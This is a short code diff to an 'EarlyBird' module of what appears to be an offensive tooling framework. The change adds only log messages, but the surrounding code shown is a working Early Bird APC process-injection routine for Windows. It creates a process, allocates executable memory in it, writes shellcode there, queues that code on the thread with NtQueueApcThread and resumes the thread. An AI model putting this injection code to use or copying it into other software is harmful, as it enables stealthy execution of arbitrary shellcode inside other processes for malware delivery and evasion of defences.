@@ -66,15 +66,21 @@ class EarlyBird(cypy.Module):
 			cypy.printe("Could not create process")
 			cypy.printe(f"Error code: {ctypes.windll.kernel32.GetLastError()}")
 			return
+		
+		cypy.printv(f"Successfully created process {abstarget} (PID {pi.dwProcessId})")
 
 		mem = win32process.VirtualAllocEx(pi.hProcess, 0, len(
 			shellcode), win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_EXECUTE_READWRITE)
 		win32process.WriteProcessMemory(pi.hProcess, mem, shellcode)
 
+		cypy.printv(f"Successfully allocated {len(shellcode)} bytes of memory at 0x{mem:X} in {abstarget} (PID {pi.dwProcessId})")
+
 		ctypes.windll.ntdll.NtQueueApcThread(
 			pi.hThread, ctypes.cast(mem, ctypes.c_void_p), 0, 0, 0)
 
 		win32process.ResumeThread(pi.hThread)
+
+		cypy.printv(f"Successfully resumed thread in {abstarget} (PID {pi.dwProcessId})")
 
 		win32api.CloseHandle(pi.hThread)
 		win32api.CloseHandle(pi.hProcess)
